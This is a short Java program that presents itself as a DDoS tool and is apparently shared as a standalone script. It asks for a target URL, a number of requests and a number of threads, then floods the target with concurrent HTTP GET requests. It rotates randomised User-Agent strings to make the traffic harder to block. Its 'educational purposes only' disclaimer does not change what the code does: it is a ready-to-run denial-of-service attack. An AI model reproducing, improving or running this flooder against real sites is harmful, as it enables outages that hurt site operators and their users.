package me.lars;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {

    final static String[] UserAgent = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
            "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
            // add more user agents here
    };

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.println(
                "\nJava DDoS by jaavalover" +
                "\nDisclaimer: This script was written for educational purposes only! DDOS ATTACKS ARE ILLEGAL" +
                "\n(use at your own risk)\n");


        System.out.println("target url: ");
        String target = scanner.nextLine();
        System.out.println("requests: ");
        int requests = scanner.nextInt();
        System.out.println("threads: ");
        int threads = scanner.nextInt();

        ExecutorService executorService = Executors.newFixedThreadPool(threads);

        for (int i = 0; i < requests; i++) {
            executorService.execute(() -> sendRequest(target));
        }

        executorService.shutdown();
    }

    private static void sendRequest(String url) {
        try {
            Random random = new Random();
            String randomUserAgent = UserAgent[random.nextInt(UserAgent.length)];
            URL target = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) target.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", randomUserAgent);

            int responseCode = connection.getResponseCode();
            System.out.println("requested " + url + " response code: " + responseCode);

            connection.disconnect();
        } catch (IOException e) {
            System.err.println("failed to send request: " + e.getMessage());
        }
    }
}